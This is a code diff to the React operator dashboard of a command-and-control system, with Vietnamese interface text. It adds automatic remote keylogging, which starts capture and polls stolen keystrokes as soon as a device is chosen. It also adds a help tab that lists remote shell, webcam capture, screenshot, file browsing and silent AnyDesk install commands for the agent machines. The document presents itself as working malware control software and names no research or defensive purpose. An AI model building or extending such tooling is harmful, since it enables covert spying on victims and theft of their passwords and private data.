@@ -1,4 +1,4 @@
-import { useState, useEffect, useCallback } from 'react';
+import { useState, useEffect, useCallback, useRef } from 'react';
 import axios from 'axios';
 import './App.css';
 
@@ -18,9 +18,12 @@ function App() {
   const [fullOutput, setFullOutput] = useState(null);
   const [logs, setLogs] = useState([]);
   const [logLevel, setLogLevel] = useState('');
+  const [logDevice, setLogDevice] = useState('');
   const [keylogDevice, setKeylogDevice] = useState('');
   const [keylogData, setKeylogData] = useState('');
   const [keylogStatus, setKeylogStatus] = useState('');
+  const [keylogAuto, setKeylogAuto] = useState(false);
+  const keylogIntervalRef = useRef(null);
 
   const api = useCallback(() => axios.create({
     baseURL: API,
@@ -46,12 +49,12 @@ function App() {
   const fetchLogs = useCallback(async () => {
     try {
       const params = {};
-      if (selectedDevice) params.device_id = selectedDevice;
+      if (logDevice) params.device_id = logDevice;
       if (logLevel) params.level = logLevel;
       const r = await api().get('/api/logs', { params });
       setLogs(r.data);
     } catch (e) {}
-  }, [api, selectedDevice, logLevel]);
+  }, [api, logDevice, logLevel]);
 
   useEffect(() => {
     if (!token) return;
@@ -59,6 +62,39 @@ function App() {
     const iv = setInterval(() => { fetchStats(); fetchDevices(); fetchCommands(); fetchLogs(); }, 5000);
     return () => clearInterval(iv);
   }, [token, fetchStats, fetchDevices, fetchCommands, fetchLogs]);
+
+  // Auto scroll logs xuong cuoi
+  useEffect(() => {
+    const el = document.getElementById('log-list');
+    if (el) el.scrollTop = el.scrollHeight;
+  }, [logs]);
+
+  // Auto keylog polling
+  useEffect(() => {
+    if (!keylogAuto || !keylogDevice) return;
+    const poll = async () => {
+      try {
+        await api().post('/api/commands', null, { params: { device_id: keylogDevice, command: 'keylog_get' } });
+        // Cho 2s de agent xu ly
+        setTimeout(async () => {
+          try {
+            const r = await api().get('/api/commands', { params: { device_id: keylogDevice, limit: 1 } });
+            const last = r.data[0];
+            if (last && last.command_text === 'keylog_get' && last.output && last.output !== '[KEYLOG] Chua co du lieu') {
+              let txt = last.output.replace('[KEYLOG] Du lieu ghi nhan:\n', '');
+              setKeylogData(prev => (prev || '') + txt);
+              // Auto scroll xuong
+              const el = document.getElementById('keylog-display');
+              if (el) el.scrollTop = el.scrollHeight;
+            }
+          } catch(e) {}
+        }, 2500);
+      } catch(e) {}
+    };
+    poll();
+    const iv = setInterval(poll, 4000);
+    return () => clearInterval(iv);
+  }, [keylogAuto, keylogDevice, api]);
 
   const login = async (e) => {
     e.preventDefault();
@@ -130,6 +166,7 @@ function App() {
           <button className={tab === 'commands' ? 'active' : ''} onClick={() => setTab('commands')}>💻 Lenh</button>
           <button className={tab === 'keylog' ? 'active' : ''} onClick={() => setTab('keylog')}>⌨️ Keylog</button>
           <button className={tab === 'logs' ? 'active' : ''} onClick={() => setTab('logs')}>📋 Logs</button>
+          <button className={tab === 'docs' ? 'active' : ''} onClick={() => setTab('docs')}>📖 Docs</button>
           <button className={tab === 'alerts' ? 'active' : ''} onClick={() => setTab('alerts')}>🔔 Canh bao</button>
         </nav>
         <div className="user-info">
@@ -238,54 +275,35 @@ function App() {
         <div className="panel">
           <h2>⌨️ Keylogger</h2>
           <div className="keylog-toolbar">
-            <select value={keylogDevice} onChange={e => setKeylogDevice(e.target.value)}>
+            <select value={keylogDevice} onChange={async e => {
+              const dev = e.target.value;
+              setKeylogDevice(dev);
+              if (dev) {
+                setKeylogData('');
+                setKeylogStatus('🟢 Tu dong ghi...');
+                await api().post('/api/commands', null, { params: { device_id: dev, command: 'keylog_start' } });
+                setKeylogAuto(true);
+              } else {
+                setKeylogAuto(false);
+              }
+            }}>
               <option value="">-- Chon thiet bi --</option>
               {devices.filter(d => d.status === 'online').map(d => (
                 <option key={d.device_id} value={d.device_id}>{d.hostname} ({d.device_id.slice(-8)})</option>
               ))}
             </select>
-            <button className="btn-keylog-start" onClick={async () => {
-              if (!keylogDevice) return;
-              setKeylogStatus('⏳ Dang bat dau...');
-              try {
-                await api().post('/api/commands', null, { params: { device_id: keylogDevice, command: 'keylog_start' } });
-                setKeylogStatus('🟢 Dang ghi phim...');
-                setTimeout(() => setKeylogStatus('🟢 Dang ghi phim (nhan Get de lay du lieu)'), 2000);
-              } catch(e) { setKeylogStatus('❌ Loi: ' + e.message); }
-            }} disabled={!keylogDevice}>🔴 Start</button>
-            <button className="btn-keylog-get" onClick={async () => {
-              if (!keylogDevice) return;
-              setKeylogStatus('⏳ Dang lay du lieu...');
-              try {
-                await api().post('/api/commands', null, { params: { device_id: keylogDevice, command: 'keylog_get' } });
-                setKeylogStatus('✅ Da gui lenh get, cho 3s...');
-                setTimeout(async () => {
-                  try {
-                    const r = await api().get('/api/commands', { params: { device_id: keylogDevice, limit: 1 } });
-                    const last = r.data[0];
-                    if (last && last.command_text === 'keylog_get') {
-                      setKeylogData(last.output || '(trong)');
-                      setKeylogStatus('✅ Da cap nhat');
-                    } else {
-                      setKeylogStatus('⏳ Cho them...');
-                    }
-                  } catch(e) { setKeylogStatus('❌ Loi lay du lieu'); }
-                }, 4000);
-              } catch(e) { setKeylogStatus('❌ Loi: ' + e.message); }
-            }} disabled={!keylogDevice}>📋 Get</button>
             <button className="btn-keylog-stop" onClick={async () => {
-              if (!keylogDevice) return;
-              setKeylogStatus('⏳ Dang dung...');
-              try {
+              setKeylogAuto(false);
+              if (keylogDevice) {
                 await api().post('/api/commands', null, { params: { device_id: keylogDevice, command: 'keylog_stop' } });
-                setKeylogStatus('⏹️ Da dung');
-              } catch(e) { setKeylogStatus('❌ Loi: ' + e.message); }
+              }
+              setKeylogStatus('⏹️ Da dung');
             }} disabled={!keylogDevice}>⏹️ Stop</button>
           </div>
           <div className="keylog-status">{keylogStatus}</div>
           <div className="keylog-output">
-            <pre>{keylogData || 'Chua co du lieu. Nhan Start -> Get de xem.'}</pre>
-            <button className="btn-clear" onClick={() => { setKeylogData(''); setKeylogStatus(''); }}>🗑️ Xoa</button>
+            <pre id="keylog-display">{keylogData || 'Chon thiet bi -> tu dong ghi phim...'}</pre>
+            <button className="btn-clear" onClick={() => { setKeylogData(''); }}>🗑️ Xoa</button>
           </div>
         </div>
       )}
@@ -294,7 +312,7 @@ function App() {
         <div className="panel">
           <h2>📋 Nhat ky thiet bi</h2>
           <div className="log-filter">
-            <select value={selectedDevice} onChange={e => setSelectedDevice(e.target.value)}>
+            <select value={logDevice} onChange={e => setLogDevice(e.target.value)}>
               <option value="">-- Tat ca thiet bi --</option>
               {devices.map(d => (
                 <option key={d.device_id} value={d.device_id}>{d.hostname} ({d.device_id.slice(-8)})</option>
@@ -309,7 +327,7 @@ function App() {
               <option value="CRITICAL">CRITICAL</option>
             </select>
           </div>
-          <div className="log-list">
+          <div id="log-list" className="log-list">
             {logs.length === 0 ? (
               <p className="empty">Khong co log nao</p>
             ) : (
@@ -323,6 +341,95 @@ function App() {
                 </div>
               ))
             )}
+          </div>
+        </div>
+      )}
+
+      {tab === 'docs' && (
+        <div className="panel">
+          <h2>📖 Huong dan su dung</h2>
+
+          <div className="docs-section">
+            <h3>📡 Thiet bi</h3>
+            <p>Danh sach cac may da ket noi. Online = xanh, Offline = xam.</p>
+            <ul>
+              <li>💻 <b>Chon may</b> → chuyen sang tab Lenh de gui lenh</li>
+              <li>🗑️ <b>Xoa may</b> → xoa khoi danh sach</li>
+            </ul>
+          </div>
+
+          <div className="docs-section">
+            <h3>💻 Lenh shell</h3>
+            <p>Gui lenh CMD / PowerShell bat ky toi may da chon:</p>
+            <div className="docs-table">
+              <div className="docs-row"><code>ipconfig /all</code><span>Xem IP, DNS, Gateway</span></div>
+              <div className="docs-row"><code>whoami</code><span>Ten nguoi dung hien tai</span></div>
+              <div className="docs-row"><code>systeminfo</code><span>Thong tin he thong</span></div>
+              <div className="docs-row"><code>tasklist</code><span>Danh sach tien trinh</span></div>
+              <div className="docs-row"><code>netstat -an</code><span>Cac cong dang mo</span></div>
+              <div className="docs-row"><code>dir C:\</code><span>Xem thu muc C:</span></div>
+              <div className="docs-row"><code>powershell -Command \"...\"</code><span>Lenh PowerShell</span></div>
+            </div>
+          </div>
+
+          <div className="docs-section">
+            <h3>⌨️ Keylogger</h3>
+            <p>Ghi lai phim go tu xa. Mo tab <b>⌨️ Keylog</b>, chon may -> tu dong ghi.</p>
+            <div className="docs-table">
+              <div className="docs-row"><code>keylog_start</code><span>Bat dau ghi phim</span></div>
+              <div className="docs-row"><code>keylog_get</code><span>Lay du lieu phim da go</span></div>
+              <div className="docs-row"><code>keylog_stop</code><span>Dung ghi phim</span></div>
+            </div>
+          </div>
+
+          <div className="docs-section">
+            <h3>📸 Webcam</h3>
+            <p>Gui lenh <code>webcam</code> → agent tu dong cai opencv + chup webcam → gui anh ve Dashboard.</p>
+          </div>
+
+          <div className="docs-section">
+            <h3>🖥️ Screenshot</h3>
+            <p>Gui lenh <code>screen</code> → chup man hinh may do → gui anh ve Dashboard.</p>
+          </div>
+
+          <div className="docs-section">
+            <h3>📁 File Browser</h3>
+            <p>Xem danh sach file/thu muc tren may kia:</p>
+            <div className="docs-table">
+              <div className="docs-row"><code>ls D:\</code><span>Xem thu muc D:</span></div>
+              <div className="docs-row"><code>ls C:\Users</code><span>Xem thu muc Users</span></div>
+              <div className="docs-row"><code>ls D:\file.txt</code><span>Xem thong tin 1 file</span></div>
+            </div>
+          </div>
+
+          <div className="docs-section">
+            <h3>🖱️ Remote Desktop</h3>
+            <p>Gui lenh <code>rd</code> → agent tu dong tai AnyDesk + chay + tra ve ID → ban nhap ID AnyDesk de remote.</p>
+          </div>
+
+          <div className="docs-section">
+            <h3>📋 Logs</h3>
+            <p>Tab <b>📋 Logs</b> hien thi nhat ky hoat dong cua cac may. Loc theo may hoac level (INFO, WARN, ERROR).</p>
+          </div>
+
+          <div className="docs-section">
+            <h3>🔔 Canh bao</h3>
+            <p>Hien thi canh bao khi may offline, CPU/RAM cao, hoac lenh that bai.</p>
+          </div>
+
+          <div className="docs-section">
+            <h3>🏗️ Kien truc he thong</h3>
+            <div className="docs-diagram">
+              <pre>{`
+  Dashboard (may ban) ──https──┐
+                               V
+  C2 Server (VPS) ── PostgreSQL + Redis
+      │
+      ├── Agent May A (exe)
+      ├── Agent May B (exe)
+      └── Agent May C (exe)
+              `}</pre>
+            </div>
           </div>
         </div>
       )}
